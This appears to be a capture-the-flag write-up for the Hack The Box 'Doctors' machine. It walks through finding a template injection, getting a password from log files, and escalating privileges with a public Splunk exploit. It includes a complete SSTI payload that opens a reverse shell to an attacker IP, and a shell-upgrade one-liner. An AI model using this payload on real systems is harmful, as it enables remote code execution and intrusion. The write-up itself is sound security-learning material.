---
published: true
---
## Getting user.txt

Full nmap scan results (TCP):

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_12-47.png)

On the website on port 80, I found an email address, info@doctors.htb. I added the hostname to my /etc/hosts file.

After adding the site to my hosts file, and getting pissed off at Chrome browser which refused to show the site and kept sending me to a Verizon search page, I opened it in Firefox and found I was referred to the following site:

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_12-55.png)

I checked for SQL injection in the login form and didn't find any, so I clicked the link to "Sign Up Now".

The messages reflected whatever you put into the title and content field back to the page. I tested for XSS and SSTI (Server Side Template Injection), but didn't find anything right away. For now I'm going to run FFUF to find new directories, and maybe come back to testing the messaging form later.

FFUF found an additional directory, /archive but it was a blank page.

I entered another message as seen below:

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_13-21.png)

After entering the SSTI payloads in the above message, I went back to the /archive URL and found the following in the page source:

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_13-23.png)

It looks like we have template injection, either Jinja2 or Twig. The Tplmap tool won't work here since the detection is on a different URL from the injection point. I had some recent experience playing around with SSTI on pentesterlab.com. After some manual trial and error, I finally got a reverse shell using the following payload:

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.19\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_13-39.png)

Did you notice that the current user, web, is a member of the 'adm' group? Members of the adm group can usually view files in /var/log. I found a password in /var/log/apache2/backup file:

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_14-02.png)

I already know there is a user named 'shaun' by looking at the /home directory. I got the user.txt flag by su shaun and using the password found in the backup file:

![](ihttps://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_14-04.png)

I then upgraded my shell using the following:

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

After looking for the obvious, includeing 'sudo -l' to see if I can use sudo, I decided to circle back to Splunk which was found earlier running on port 8089.

After doing some searching, I find the following exploit: https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2

Run the exploit:

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_14-56.png)

Catch a root shell:

![](https://github.com/sdcampbell/sdcampbell.github.io/tree/master/images/2021-02-02_14-57.png)
